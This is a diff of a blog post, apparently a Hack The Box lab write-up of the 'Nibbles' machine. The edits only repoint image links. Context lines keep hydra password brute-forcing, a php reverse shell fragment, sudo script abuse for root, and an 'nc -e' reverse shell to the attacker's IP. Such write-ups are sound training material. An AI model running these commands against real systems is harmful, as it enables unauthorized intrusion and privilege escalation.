@@ -9,7 +9,7 @@ date: "2019-03-17"
 lastmod: "2026-08-08"
 ---
 
-![Ae0G8g.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/47a5f56710b4.png)
+![Ae0G8g.png](/img/content/47a5f56710b4.webp)
 
 ## Introduction
 
@@ -24,7 +24,7 @@ Firstly, detect the open ports:
 nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75
 ```
 
-![Ae19BQ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/cc64bb41eafd.png)
+![Ae19BQ.png](/img/content/cc64bb41eafd.webp)
 
 There are not too many open ports, just `80` and `22`. Detect the detailed services of the open ports:
 
@@ -32,7 +32,7 @@ There are not too many open ports, just `80` and `22`. Detect the detailed servi
 nmap -sC -sV -oA services 10.10.10.75
 ```
 
-![Ae1E90.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ebe33e24e983.png)
+![Ae1E90.png](/img/content/ebe33e24e983.webp)
 
 Nothing special found. The only clue may be the open port of `80`. To be honest, the box with less open ports is easier in general.
 
@@ -42,11 +42,11 @@ Nothing special found. The only clue may be the open port of `80`. To be honest,
 
 Access to `http://10.10.10.75`, just a web page of `hello world`.
 
-![Ae0qsA.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5b9c2d80261d.png)
+![Ae0qsA.png](/img/content/5b9c2d80261d.webp)
 
 With the first sight, have not found anything special. Open the inspector, a comment can be found. Obviously, `nibbleblog` is quite important to us. Access to `http://10.10.10.75/nibbleblog`:
 
-![Ae0XZt.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f945c2e25684.png)
+![Ae0XZt.png](/img/content/f945c2e25684.webp)
 
 It seems to be a blog demo. Try to access to each hyperlink in the web page, find nothing special. Try to use nikto to explore:
 
@@ -54,7 +54,7 @@ It seems to be a blog demo. Try to access to each hyperlink in the web page, fin
 nikto -host http://10.10.10.75/nibbleblog/
 ```
 
-![AeYklt.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f30066345eb7.png)
+![AeYklt.png](/img/content/f30066345eb7.webp)
 
 `[nibbleblog](http://www.nibbleblog.com/)`  is an open source blog system which has been widely used. From the above screenshot, some interesting links can be found. And also try to brute force with `gobuster`:
 
@@ -64,21 +64,21 @@ gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirbuster/wordlists/dir
 
 Similarly, the directory of `nibbleblog` can be found, just like admin, content, etc. Open the README of the blog:
 
-![AeYynK.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5f4d55418172.png)
+![AeYynK.png](/img/content/5f4d55418172.webp)
 
 The version is `4.0.3`. Google with `nibbleblog 4.0.3 exploit`. Find a [report](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) to talk about the exploit of nibbleblog of `4.0.3`.
 
-![AeYRtH.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/02391d3eb4dd.png)
+![AeYRtH.png](/img/content/02391d3eb4dd.webp)
 
 The research report is detailed. But there is a precondition that you have to obtain admin credentials. Access to login page: `http://10.10.10.75/nibbleblog/admin.php`.
 
-![AeY5ct.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/a6399ea1bb93.png)
+![AeY5ct.png](/img/content/a6399ea1bb93.webp)
 
 Try the password of `123456` and `admin`. Both are not correct. I have even tried to use hydra:
 
 `hydra -l admin -P /usr/share/wordlist/rockyou.txt -vV -f -t 2 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:login_error"`
 
-![AetpuV.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/999a82a4ffe9.png)
+![AetpuV.png](/img/content/999a82a4ffe9.webp)
 
 The hydra result shows that the password is `123456`. But it is not correct. I doubt it has something with the blacklist of `nibbleblog`. Whatever, try to figure out the password. Try `nibbles`. Wow, we are in. You should try every password as more as possible. 
 
@@ -240,17 +240,17 @@ function printit ($string) {
 
 Accomplish the last step, get the user shell!
 
-![AetbKx.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5380baf38eed.png)
+![AetbKx.png](/img/content/5380baf38eed.webp)
 
 ## Privilege escalation
 
 The next step is to get the root shell. Try to check the kernel of the linux:
 
-![AeNAZ8.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/6fbf828a7774.png)
+![AeNAZ8.png](/img/content/6fbf828a7774.webp)
 
 The kernel seems quite fresh. It may be hard to find the kernel exploit. Try to check the sudo permission of nibbler: `sudo -l`.
 
-![AeNuzn.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/abc6756263e3.png)
+![AeNuzn.png](/img/content/abc6756263e3.webp)
 
 Just as expected, find a file `monitor.sh` with root permission. Try to read the file with:
 
@@ -258,7 +258,7 @@ Just as expected, find a file `monitor.sh` with root permission. Try to read the
 cat /home/nibbler/personal/stuff/monitor.sh
 ```
 
-![AeNrdO.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/e31074d67b3b.png)
+![AeNrdO.png](/img/content/e31074d67b3b.webp)
 
 The file seems to be a bash script with several tasks. There is no need to understand the usage of the file. We can just modify the script to obtain root shell. So the script should be modified. As it is not convenient to modify the file in the victim machine directly. `Nc` can be used to send and receive file.
 
@@ -284,7 +284,7 @@ nc -e 10.10.16.44 1111
 
 Try to set `nc` listen to `1111`:
 
-![AeUA61.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d8b6d9829d09.png)
+![AeUA61.png](/img/content/d8b6d9829d09.webp)
 
 There's a problem with the `nc` in the victim machine. `e` option is invalid in the victim machine. May there are some solutions, but I turn to other reverse shell methods right away.
 
@@ -306,7 +306,7 @@ sudo ./monitor.sh
 
 Here is the root.
 
-![AeaECQ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/00db624c19dd.png)
+![AeaECQ.png](/img/content/00db624c19dd.webp)
 
  
 
